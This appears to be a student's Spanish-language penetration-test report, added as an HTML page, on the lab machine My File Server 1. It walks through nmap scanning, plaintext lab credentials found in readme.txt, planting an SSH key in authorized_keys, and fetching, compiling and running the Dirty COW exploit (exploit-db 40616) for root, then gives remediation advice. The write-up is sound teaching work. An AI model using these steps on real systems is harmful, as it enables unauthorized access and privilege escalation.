@@ -1,0 +1,243 @@
+<!DOCTYPE HTML>
+<!--
+	Telephasic by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Actividad #9 - 180370</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body class="no-sidebar is-preload">
+		<div id="page-wrapper">
+
+			<!-- Header -->
+				<div id="header-wrapper">
+					<div id="header" class="container">
+
+						<!-- Logo -->
+							<h1 id="logo"><a href="index.html">REGRESAR</a></h1>
+					</div>
+				</div>
+
+			<!-- Main -->
+				<div class="wrapper">
+					<div class="container" id="main">
+
+						<!-- Content -->
+                        <article id="content">
+                            <header>
+                                <h2>ACTIVIDAD #9</h2>
+                            </header>
+
+                            <p>
+                            Esta evaluación de seguridad se realizó sobre la máquina vulnerable <strong>My File Server 1</strong>, 
+                            la cual simula un servidor corporativo de archivos en un entorno controlado. El ejercicio confirmó una 
+                            cadena de compromiso completa: desde la exposición inicial de servicios y contraseñas hasta la obtención de 
+                            privilegios de superusuario, por lo que el riesgo global del activo se clasifica como <strong>crítico</strong>.
+                            </p>
+
+                            <p>
+                            La causa raíz del compromiso radica en la combinación de debilidades encadenables: exposición de información sensible por HTTP, 
+                            reutilización de credenciales, falta de controles en servicios de transferencia y un kernel desactualizado susceptible a 
+                            escalada de privilegios mediante <em>Dirty COW</em>. En un escenario real, esto permitiría el acceso no autorizado a documentos, 
+                            alteración de información e interrupción operativa.
+                            </p>
+
+                            <hr>
+
+                            <h3>1. Alcance y restricciones del ejercicio</h3>
+
+                            <p>
+                            El análisis se enfocó de manera exclusiva en los siguientes parámetros de ejecución:
+                            </p>
+
+                            <ul>
+                              <li><strong>Sistema objetivo:</strong> My File Server 1 (Servidor de archivos).</li>
+                              <li><strong>Dirección IP analizada:</strong> 192.168.56.104.</li>
+                              <li><strong>Metodología de referencia:</strong> PTES y OWASP Testing Guide.</li>
+                              <li><strong>Herramientas principales:</strong> netdiscover, Nmap, enum4linux, smbclient, Nikto, FTP, SSH, uname, gcc y wget.</li>
+                              <li><strong>Restricciones:</strong> No se realizaron ataques de denegación de servicio (DoS) ni pruebas destructivas que afectaran infraestructura fuera del laboratorio académico.</li>
+                            </ul>
+
+                            <hr>
+
+                            <h3>2. Metodología aplicada (Flujo de decisión técnica)</h3>
+
+                            <p>
+                            La metodología se aplicó como un flujo dinámico donde cada hallazgo habilitó el paso siguiente de la intrusión:
+                            </p>
+
+                            <table border="1" style="width:100%; border-collapse: collapse; text-align: left;">
+                              <thead>
+                                <tr style="background-color: #f2f2f2;">
+                                  <th style="padding: 8px;">Fase</th>
+                                  <th style="padding: 8px;">Objetivo</th>
+                                  <th style="padding: 8px;">Hallazgo clave</th>
+                                  <th style="padding: 8px;">Transición metodológica</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td style="padding: 8px;"><strong>Reconocimiento</strong></td>
+                                  <td style="padding: 8px;">Identificar el host y mapear superficie expuesta.</td>
+                                  <td style="padding: 8px;">Detección de múltiples servicios abiertos (FTP, SSH, HTTP, RPC, SMB, NFS).</td>
+                                  <td style="padding: 8px;">Obligó a priorizar vectores con potencial de exposición de información.</td>
+                                </tr>
+                                <tr>
+                                  <td style="padding: 8px;"><strong>Enumeración</strong></td>
+                                  <td style="padding: 8px;">Profundizar en servicios y buscar evidencia accionable.</td>
+                                  <td style="padding: 8px;">HTTP permitió acceder a <code>/readme.txt</code> sin credenciales; SMB/NFS ampliaron el contexto.</td>
+                                  <td style="padding: 8px;">El archivo aportó credenciales válidas y justificó validar accesos en servicios autenticados.</td>
+                                </tr>
+                                <tr>
+                                  <td style="padding: 8px;"><strong>Explotación</strong></td>
+                                  <td style="padding: 8px;">Obtener acceso inicial reproducible.</td>
+                                  <td style="padding: 8px;">Credenciales <code>smbuser / rootroot1</code> permitieron el ingreso y preparación de acceso remoto.</td>
+                                  <td style="padding: 8px;">Con acceso de usuario válido, se pudo verificar el sistema operativo para buscar escalada local.</td>
+                                </tr>
+                                <tr>
+                                  <td style="padding: 8px;"><strong>Escalada</strong></td>
+                                  <td style="padding: 8px;">Alcanzar los máximos privilegios en el host.</td>
+                                  <td style="padding: 8px;">El kernel 3.10.0-229.el7.x86_64 resultó vulnerable a Dirty COW (CVE-2016-5195).</td>
+                                  <td style="padding: 8px;">La explotación local permitió obtener contexto de <strong>root</strong> y el control total del servidor.</td>
+                                </tr>
+                              </tbody>
+                            </table>
+
+                            <hr>
+
+                            <h3>3. Fase de reconocimiento y escaneo de puertos</h3>
+
+                            <p>
+                            Se utilizó <code>netdiscover</code> para ubicar la IP objetivo (192.168.56.104) y posteriormente se lanzó un escaneo exhaustivo con Nmap:
+                            </p>
+
+                            <pre>nmap -sS -sV -O -p- 192.168.56.104</pre>
+
+                            <p><strong>Puertos críticos detectados para la priorización de vectores:</strong></p>
+
+                            <ul>
+                              <li><strong>Puerto 80 (HTTP - Apache 2.4.6):</strong> Prioridad Crítica. Vector principal por exposición de contenido libre (origen del archivo <code>readme.txt</code>).</li>
+                              <li><strong>Puerto 445 (SMB - Samba 3.X-4.X) y Puerto 2049 (NFS):</strong> Prioridad Alta. Recursos compartidos en un servidor de archivos que denotaban administración laxa.</li>
+                              <li><strong>Puertos 21 (FTP - vsftpd) y 22 (SSH - OpenSSH 7.4):</strong> Prioridad Alta. Considerados canales de validación de credenciales y consolidación del acceso interactivo.</li>
+                            </ul>
+
+                            <hr>
+
+                            <h3>4. Enumeración y explotación del sistema</h3>
+
+                            <p>
+                            Durante la fase de enumeración profunda utilizando comandos de diagnóstico como <code>nmap -sV</code>, <code>nikto</code> y herramientas de recolección para Samba como <code>enum4linux</code> (instalada mediante <code>sudo apt install enum4linux</code>), se detectó la estructura de directorios web y los compartidos de red.
+                            </p>
+
+                            <p><strong>Secuencia cerrada de la explotación:</strong></p>
+
+                            <ol>
+                              <li><strong>Identificación del recurso expuesto:</strong> Se revisó el servicio HTTP y se localizó el archivo <code>/readme.txt</code> en texto plano, el cual almacenaba los secretos de acceso: <code>smbuser / rootroot1</code>.</li>
+                              <li><strong>Validación de credenciales:</strong> Se probaron los datos obtenidos en el servicio FTP, logrando una autenticación exitosa que confirmó malas prácticas de reutilización de contraseñas.</li>
+                              <li><strong>Persistencia de acceso remoto:</strong> En la máquina atacante se generó un par de llaves SSH y mediante el acceso previo se incrustó la clave pública dentro de las llaves autorizadas del usuario comprometido:
+                                <pre>cat id_ed25519.pub > authorized_keys</pre>
+                              </li>
+                              <li><strong>Acceso inicial por SSH:</strong> Se estableció una sesión interactiva estable como <code>smbuser</code>. Una vez dentro, se ejecutó <code>uname -r</code> para validar el entorno real, devolviendo el kernel <code>3.10.0-229.el7.x86_64</code>.</li>
+                            </ol>
+
+                            <hr>
+
+                            <h3>5. Escalada de privilegios a Root (Dirty COW)</h3>
+
+                            <p>
+                            La versión de kernel identificada pertenece de forma directa a sistemas Linux afectados por la vulnerabilidad de condición de carrera <strong>CVE-2016-5195 (Dirty COW)</strong> en su mecanismo de <em>copy-on-write</em>.
+                            </p>
+
+                            <p><strong>Ejecución del exploit local:</strong></p>
+                            
+                            <p>Se descargó, compiló y ejecutó el código para forzar la elevación de privilegios:</p>
+
+                            <pre>
+							wget https://www.exploit-db.com/download/40616 -O cowroot.c
+							gcc cowroot.c -o cowroot -pthread
+							./cowroot
+							</pre>
+
+                            <p>
+                            Tras la ejecución exitosa, el proceso modificó los privilegios de la sesión actual, otorgando un contexto con los privilegios máximos (<strong>root</strong>), lo cual se validó mediante el ingreso al directorio reservado <code>/root</code> y la lectura del archivo de banderas <code>proof.txt</code>.
+                            </p>
+
+                            <hr>
+
+                            <h3>6. Análisis de impacto (Modelo CIA)</h3>
+
+                            <ul>
+                              <li><strong>Confidencialidad (Crítico):</strong> Fuga total de información corporativa y credenciales de administración en texto claro.</li>
+                              <li><strong>Integridad (Alto):</strong> Capacidad completa para modificar archivos del sistema, alterar bitácoras o sembrar software malicioso desde el rol de superusuario.</li>
+                              <li><strong>Disponibilidad (Alto):</strong> Posibilidad de borrar particiones completas, detener servicios críticos de la empresa o inutilizar el servidor permanentemente.</li>
+                            </ul>
+
+                            <hr>
+
+                            <h3>7. Recomendaciones técnicas y plan de remediación</h3>
+
+                            <ul>
+                              <li><strong>Remediación Inmediata (Web y Credenciales):</strong> Retirar el archivo <code>readme.txt</code> del servidor web, prohibir el almacenamiento de secretos en texto claro y rotar de manera urgente la contraseña del usuario <code>smbuser</code>.</li>
+                              <li><strong>Remediación Alta (Endurecimiento de SSH y Red):</strong> Deshabilitar el acceso por contraseña para cuentas críticas en el archivo <code>sshd_config</code>, restringir el uso de <code>authorized_keys</code> y acotar los servicios SMB/NFS únicamente a los segmentos de red autorizados.</li>
+                              <li><strong>Remediación Alta (Parchado de Kernel):</strong> Actualizar el kernel del sistema operativo a una versión estable y soportada que mitigue de raíz la vulnerabilidad Dirty COW.</li>
+                              <li><strong>Remediación Media (Monitoreo):</strong> Centralizar las bitácoras (logs) de autenticación y transferencias de archivos en un sistema SIEM para identificar patrones anómalos a tiempo.</li>
+                            </ul>
+
+                            <hr>
+
+                            <h3>Conclusión</h3>
+
+                            <p>
+                            Este ejercicio demostró que la seguridad de un activo no depende de un solo control, sino de la solidez de toda la cadena de configuración. El eslabón más débil comenzó con una simple omisión en el servidor web (un archivo de texto olvidado) y culminó en la pérdida total del control del servidor de archivos debido a un sistema operativo desactualizado. 
+                            </p>
+                            
+                            <p>
+                            Garantizar revisiones periódicas de parches de seguridad y aplicar políticas estrictas de contraseñas robustas y únicas son requisitos indispensables para salvaguardar la infraestructura en un entorno empresarial real.
+                            </p>
+
+                            <h3>Referencias</h3>
+
+                            <ul>
+                              <li>Penetration Testing Execution Standard (PTES) Technical Guidelines: http://www.pentest-standard.org/</li>
+                              <li>OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/</li>
+                              <li>Exploit Database - Dirty COW race condition exploit (CVE-2016-5195): https://www.exploit-db.com/exploits/40616</li>
+                            </ul>
+
+                            <ul class="actions">
+                                <li>
+                                    <a href="docs/180370-act09.pdf" class="button" download>
+                                        Descargar actividad
+                                    </a>
+                                </li>
+                            </ul>
+
+                        </article>
+					</div>
+				</div>
+
+			<!-- Footer -->
+				<div id="footer-wrapper">
+					<div id="copyright" class="container">
+						<ul class="menu">
+							<li>&copy; Juan Alejandro Pérez Ventura. Todos los derechos reservados.</li><li>Diseño: <a href="http://html5up.net">HTML5 UP</a></li>
+						</ul>
+					</div>
+				</div>
+
+		</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.dropotron.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
